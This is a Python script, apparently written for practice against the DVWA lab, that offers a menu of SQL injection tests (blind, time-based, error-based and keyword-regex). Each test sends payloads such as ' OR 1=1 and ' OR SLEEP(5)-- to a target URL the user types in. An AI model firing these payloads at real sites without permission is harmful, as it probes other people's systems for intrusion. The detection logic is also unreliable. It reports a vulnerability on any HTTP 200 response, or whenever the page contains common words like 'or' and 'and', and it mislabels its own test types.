import requests
import time
import re


# 基于盲注
def Blind_based_injection(url):
    # 构造 SQL 注入语句
    injection_payload = "' OR 1=1"
    injection_url = url + "?id=" + injection_payload

    # 发送包含注入语句的 GET 请求，并根据响应时间判断是否存在 SQL 注入漏洞
    response = requests.get(injection_url)
    # if response.elapsed.total_seconds() > 5:
    #     return True
    # return False
    if response.status_code == 200:
        return True
    else:
        return False


def test_Blind():
    url = input("[INPUT] 请输入目标网站的 URL：")
    if Blind_based_injection(url):
        print("\n[*] SQL 注入漏洞存在于目标网站中")
    else:
        print("\n[-] 目标网站未发现 SQL 注入漏洞")


# 基于时间
def Time_based_injection(url):
    # 尝试在用户名参数中注入 SQL 代码
    injection_payload = "' OR SLEEP(5)--"
    login_data = {
        "username": injection_payload,
        "password": "password"
    }
    start_time = time.time()
    response = requests.post(url, data=login_data)
    end_time = time.time()

    # 检查响应时间是否超过指定的时间阈值
    if end_time - start_time >= 5:
        print("\n[*] SQL 注入漏洞存在于目标网站中")
    else:
        print("\n[-] 目标网站未发现 SQL 注入漏洞")


def test_Time():
    url = input("[INPUT] 请输入目标网站的 URL：")
    Time_based_injection(url)


# 基于错误
def Error_based_injection(url):
    # 尝试在用户名参数中注入 SQL 代码
    injection_payload = "' OR 1=1--"
    login_data = {
        "username": injection_payload,
        "password": "password"
    }
    response = requests.post(url, data=login_data)

    # 检查响应是否包含错误信息
    if "error" in response.text.lower():
        print("\n[*] SQL 注入漏洞存在于目标网站中")
    else:
        print("\n[-] 目标网站未发现 SQL 注入漏洞")


def test_Error():
    url = input("[INPUT] 请输入目标网站的 URL：")
    Error_based_injection(url)


# 基于正则
def Regular_based_injection(url):
    # 使用正则表达式匹配注入关键字
    injection_keywords = ['SELECT', 'UPDATE', 'INSERT', 'DELETE', 'FROM', 'WHERE', 'UNION', 'OR', 'AND', 'LIKE']
    pattern = '|'.join(injection_keywords)
    regex = re.compile(pattern, re.IGNORECASE)

    # 构造恶意的 SQL 语句进行注入检测
    payloads = ["' or 1=1 -- ", "' or 1=1 # ", "' or 1=1 /* "]

    for payload in payloads:
        # 向目标 URL 发送包含恶意 SQL 语句的请求
        attack_url = url + "?id=" + payload
        response = requests.get(attack_url)

        # 检查响应中是否包含注入关键字
        if regex.search(response.text):
            print("\n[*] SQL 注入漏洞存在于目标网站中")
            return True

    # 如果所有请求都没有检测到 SQL 注入漏洞，则判断目标 URL 安全
    print("\n[-] 目标网站未发现 SQL 注入漏洞")
    return False


def test_Regular():
    url = input("[INPUT] 请输入目标网站的 URL：")
    Regular_based_injection(url)


def main():
    while True:
        print("[MENU] 请选择要测试的 SQL 注入类型：")
        print("1. 基于盲注的 SQL 注入测试")
        print("2. 基于时间的 SQL 注入测试")
        print("3. 基于错误的 SQL 注入测试")
        print("4. 基于正则的 SQL 注入测试")
        print("0. 返回上一级")
        print("[INFO] 输入示例：http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#")
        choice = input("[INPUT] 请输入数字选择相应的测试类型: ")

        if choice == "1":
            test_Blind()
        elif choice == "2":
            test_Time()
        elif choice == "3":
            test_Error()
        elif choice == "4":
            test_Regular()
        elif choice == "0":
            # os.system('clear')
            break
        else:
            print("[-] 选择无效，请重新输入")

# if __name__ == "__main__":
#     main()
